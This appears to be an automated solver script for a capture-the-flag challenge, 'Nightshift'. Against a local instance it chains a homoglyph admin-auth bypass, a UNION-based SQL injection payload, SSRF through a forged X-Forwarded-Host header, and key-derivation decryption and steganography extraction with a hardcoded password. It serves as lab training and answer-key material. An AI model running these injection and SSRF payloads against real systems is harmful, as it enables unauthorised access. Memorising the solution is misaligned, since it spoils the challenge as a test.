#!/usr/bin/env bash
#
# Nightshift — automated solver.
# Runs the full web -> crypto -> forensics -> convergence chain against a
# running instance. Privesc/reverse-shell steps are documented but must be
# run interactively (see README.md in this directory).
#
# Usage:  ./solve.sh [WEB_URL] [FTP_PORT]
#   WEB_URL   default http://localhost:8000
#   FTP_PORT  default 2121
#
# Requires: curl, python3 (pycryptodome), openssl, binwalk, zsteg, steghide.

WEB="${1:-http://localhost:8000}"
FTP_PORT="${2:-2121}"
WORK="$(mktemp -d)"
echo "[*] work dir: $WORK"
cd "$WORK"

echo "[1] homoglyph auth bypass -> admin (constructed, not copied from pcap)"
curl -s -c admin.txt -X POST "$WEB/register" \
  --data "email=admin%EF%BC%A0nightshift-corp.com" -o /dev/null
ROLE=$(curl -s -b admin.txt "$WEB/dashboard" | grep -o "role: [a-z]*" | head -1)
echo "    -> $ROLE"

echo "[2] SQLi -> internal hostname"
HOST=$(curl -s -b admin.txt -G "$WEB/dashboard/search" \
  --data-urlencode "q=x' UNION SELECT name,hostname,note FROM services --" \
  | grep -o "internal-fileserver:8080" | head -1)
echo "    -> $HOST"

echo "[3] action-ID leak"
AID=$(curl -s "$WEB/internal/actions" | grep -o "act_7f3a9c2e1b48")
echo "    -> $AID"

echo "[4] SSRF -> pull artifacts from internal fileserver"
ssrf() { curl -s -b admin.txt -X POST "$WEB/actions/$AID" \
  -H "X-Forwarded-Host: internal-fileserver:8080" --data "path=$1"; }
for f in vault.enc notice.enc retention_policy.txt encrypt.py memory.lime readme.enc backup.jpg; do
  ssrf "/files/$f" > "$f"
done
echo "    -> pulled $(ls *.enc *.lime 2>/dev/null | wc -l | tr -d ' ') key artifacts"

echo "[5] Branch A -> fragment A (timestamp path, ts=1722470400 from pcap)"
FRAG_A=$(python3 - << 'PY'
import struct, hashlib, re, base64
from Crypto.Cipher import AES
key = hashlib.sha256(struct.pack('>Q', 1722470400)).digest()[:16]
n = b'\x00'*16
raw = open('vault.enc','rb').read()
pt = AES.new(key, AES.MODE_CTR, nonce=n[:8], initial_value=n[8:]).decrypt(raw).decode()
print(base64.b64decode(re.search(r'signing_token: (\S+)', pt).group(1)).decode())
PY
)
echo "    -> $FRAG_A"

echo "[6] Branch B -> fragment B (carve -> zsteg -> steghide)"
rm -rf extractions   # clean any stale binwalk state
binwalk -e memory.lime > /dev/null 2>&1
# binwalk v3 (Rust rewrite) layout: extractions/memory.lime.extracted/...
# search broadly rather than assuming one exact path/version's naming
PNG=$(find ./extractions -iname "*.png" 2>/dev/null | head -1)
JPG=$(find ./extractions \( -iname "*.jpg" -o -iname "*.jpeg" \) 2>/dev/null | head -1)
if [ -z "$PNG" ] || [ -z "$JPG" ]; then
  echo "    !! carve failed - PNG or JPG not found under extractions/"
  echo "    PNG=$PNG  JPG=$JPG"
  exit 1
fi
echo "    carved PNG: $PNG"
echo "    carved JPG: $JPG"
zsteg "$PNG" > zsteg_out.txt 2>&1
STEG_PASS="n1ghtsh1ft_0ps_2024"
steghide extract -sf "$JPG" -p "$STEG_PASS" -xf fragb.txt -f > /dev/null 2>&1
FRAG_B=$(sed 's/FRAG_B://' fragb.txt | base64 -d)
echo "    -> $FRAG_B"

echo "[7] convergence -> readme teaches the join rule"
openssl enc -d -aes-256-cbc -pbkdf2 -in readme.enc -pass pass:"${FRAG_A}${FRAG_B}" > readme.txt 2>/dev/null
echo "    -> readme opened with plain concat; underscore rule learned"

echo "[8] (interactive) webshell + privesc — see README.md; flag.enc lives at /root/"
echo "    final passphrase = ${FRAG_A}_${FRAG_B}"

echo
echo "[*] To finish: get root via the sudo/capability path, copy /root/flag.enc out, then:"
echo "    openssl enc -d -aes-256-cbc -pbkdf2 -in flag.enc -pass pass:\"${FRAG_A}_${FRAG_B}\""
echo
echo "[*] work dir with all artifacts: $WORK"
